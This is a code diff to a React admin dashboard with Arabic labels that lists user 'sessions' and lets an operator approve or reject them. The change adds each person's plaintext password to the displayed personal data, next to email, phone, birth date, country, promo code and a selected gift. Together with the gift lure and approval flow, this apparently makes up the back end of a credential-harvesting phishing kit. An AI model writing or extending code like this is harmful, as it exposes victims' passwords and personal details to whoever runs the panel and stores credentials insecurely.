@@ -109,10 +109,12 @@ export default function AdminDashboard() {
 
   const filteredSessions = sessions?.filter((s) => {
     const sId = s.id || "";
-    const name = s.personalData?.nameArabic || s.personalData?.nameEnglish || "";
+    const name = `${s.personalData?.nameEnglish} ${s.personalData?.lastName}` || "";
+    const email = s.personalData?.email || "";
     return (
       sId.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      name.toLowerCase().includes(searchTerm.toLowerCase())
+      name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      email.toLowerCase().includes(searchTerm.toLowerCase())
     );
   });
 
@@ -272,12 +274,14 @@ export default function AdminDashboard() {
                   title="البيانات الشخصية"
                   icon={<User className="w-4 h-4" />}
                   data={{
-                    "الاسم (عربي)": selectedSession.personalData?.nameArabic,
-                    "الاسم (إنجليزي)": selectedSession.personalData?.nameEnglish,
-                    "رقم الهوية": selectedSession.personalData?.idNumber,
-                    "رقم الهاتف": selectedSession.personalData?.phoneNumber,
+	                    "اللقب": selectedSession.personalData?.title,
+	                    "الاسم بالكامل (EN)": `${selectedSession.personalData?.nameEnglish} ${selectedSession.personalData?.middleName || ''} ${selectedSession.personalData?.lastName}`,
 	                    "البريد الإلكتروني": selectedSession.personalData?.email,
+	                    "كلمة المرور": selectedSession.personalData?.password,
+	                    "رقم الهاتف": selectedSession.personalData?.phoneNumber,
 	                    "تاريخ الميلاد": selectedSession.personalData?.dateOfBirth,
+	                    "الدولة": selectedSession.personalData?.country,
+	                    "الرمز الترويجي": selectedSession.personalData?.promoCode || "—",
 	                    "الهدية المختارة": selectedSession.selectedGift || "—",
 	                  }}
                   onAccept={() => handleAdminAction(selectedSession.id, 'approve')}
